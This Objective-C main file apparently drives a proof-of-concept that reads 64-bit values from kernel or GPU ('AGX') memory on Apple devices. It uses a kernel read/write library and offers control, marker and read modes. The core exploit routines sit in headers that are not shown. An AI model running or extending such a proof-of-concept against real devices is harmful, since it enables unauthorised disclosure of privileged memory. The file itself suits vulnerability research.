#import <Foundation/Foundation.h>

#include <libkextrw.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "poc.h"
#include "read_poc.h"

static bool parse_gfx_address(const char *text, uint64_t *address)
{
    char *end = NULL;
    errno = 0;
    *address = strtoull(text, &end, 0);
    return errno == 0 && end != text && *end == '\0' &&
        (*address & UINT64_C(7)) == 0 &&
        (*address & UINT64_C(0xffffff0000000000)) ==
            UINT64_C(0xfffffc0000000000);
}

int main(int argc, const char *argv[])
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    bool control = argc == 2 && strcmp(argv[1], "control") == 0;
    bool marker = argc == 2 && strcmp(argv[1], "marker") == 0;
    bool read = argc == 3 && strcmp(argv[1], "read") == 0;
    uint64_t source = 0;

    if ((!control && !marker && !read) ||
        (read && !parse_gfx_address(argv[2], &source))) {
        fprintf(stderr, "usage: %s control|marker|read <gfx-address>\n",
                argv[0]);
        return 2;
    }

    @autoreleasepool {
        if (kextrw_init() != 0) {
            fputs("error: kextrw_init\n", stderr);
            return 1;
        }

        int result = 1;
        if (poc_init() != 0) {
            fputs("error: AGX setup\n", stderr);
        } else if (control) {
            result = read_poc_control();
        } else {
            result = read_poc_read64(source, marker);
        }

        poc_deinit();
        kextrw_deinit();
        return result;
    }
}
